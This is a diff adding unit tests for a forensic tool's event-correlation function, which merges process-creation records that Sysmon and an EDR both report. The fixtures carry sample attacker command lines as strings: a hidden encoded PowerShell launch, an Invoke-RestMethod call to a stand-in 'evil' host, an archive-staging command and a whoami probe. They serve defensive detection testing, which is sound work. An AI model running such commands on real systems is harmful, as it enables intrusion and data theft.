@@ -87,6 +87,43 @@ describe("correlateEvents", () => {
     expect(correlateEvents([a, b, c])).toHaveLength(3);
   });
 
+  it("merges a process creation seen by two tools on the same command line + parent (different pids) (#68)", () => {
+    // Sysmon and the EDR both record the same powershell creation, but each assigns its OWN pid and
+    // neither shares a file hash — steps 0–3 all miss it. The normalized command line + parent link them.
+    const sysmon = ev({ id: "sm", description: "Sysmon Process create (EID 1) - powershell.exe - CommandLine=powershell.exe -nop -w hidden -enc SQBFAFgA",
+      asset: "FILE-BO-01.corp.local", pid: 5292, processName: "powershell.exe", parentName: "explorer.exe",
+      sources: ["Sysmon"], timestamp: "2024-05-14T13:29:39.6Z" });
+    const edr = ev({ id: "ec", description: "Process created powershell.exe (encoded) under explorer.exe",
+      commandLine: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -enc SQBFAFgA',
+      asset: "FILE-BO-01", pid: 8123, processName: "powershell.exe", parentName: "explorer.exe",
+      sources: ["EDR (ECAR)"], timestamp: "2024-05-14T13:29:40.2Z" });
+    const out = correlateEvents([sysmon, edr]);
+    expect(out).toHaveLength(1);
+    expect(out[0].sources).toEqual(expect.arrayContaining(["Sysmon", "EDR (ECAR)"]));
+  });
+
+  it("does NOT merge distinct commands from ONE tool that share a parent, nor the same command outside the window (#68)", () => {
+    const mk = (id: string, cmd: string, t: string): ForensicEvent => ev({
+      id, description: `Sysmon Process create (EID 1) - CommandLine=${cmd}`, asset: "H1",
+      pid: Math.floor(Math.random() * 1e6), processName: "powershell.exe", parentName: "explorer.exe",
+      sources: ["Sysmon"], timestamp: t,
+    });
+    // Two distinct commands from the same tool → never merge (corroboration guard).
+    const a = mk("a", "powershell.exe -c Compress-Archive -Path D:\\Data", "2024-05-14T13:00:00Z");
+    const b = mk("b", "powershell.exe -c Invoke-RestMethod http://evil/x", "2024-05-14T13:00:01Z");
+    // Same command as `a` but from a DIFFERENT tool, 10 minutes later → beyond the 60s window.
+    const c = ev({ id: "c", description: "EDR: Process created", commandLine: "powershell.exe -c Compress-Archive -Path D:\\Data",
+      asset: "H1", pid: 9, processName: "powershell.exe", parentName: "explorer.exe", sources: ["EDR (ECAR)"], timestamp: "2024-05-14T13:10:01Z" });
+    expect(correlateEvents([a, b, c])).toHaveLength(3);
+  });
+
+  it("populates chainSignature on a process-creation event (#68)", () => {
+    const e = ev({ id: "p", description: "Sysmon Process create (EID 1) - CommandLine=cmd.exe /c whoami",
+      asset: "H", pid: 100, processName: "cmd.exe", parentName: "explorer.exe", sources: ["Sysmon"] });
+    const [out] = correlateEvents([e]);
+    expect(out.chainSignature).toBeTruthy();
+  });
+
   it("does NOT treat a URL in the description as a shared file path (#102)", () => {
     // Two different Defender detections seconds apart, each message carrying the same Microsoft
     // fwlink URL. The URL must not be read as a filesystem path and collapse them into one.
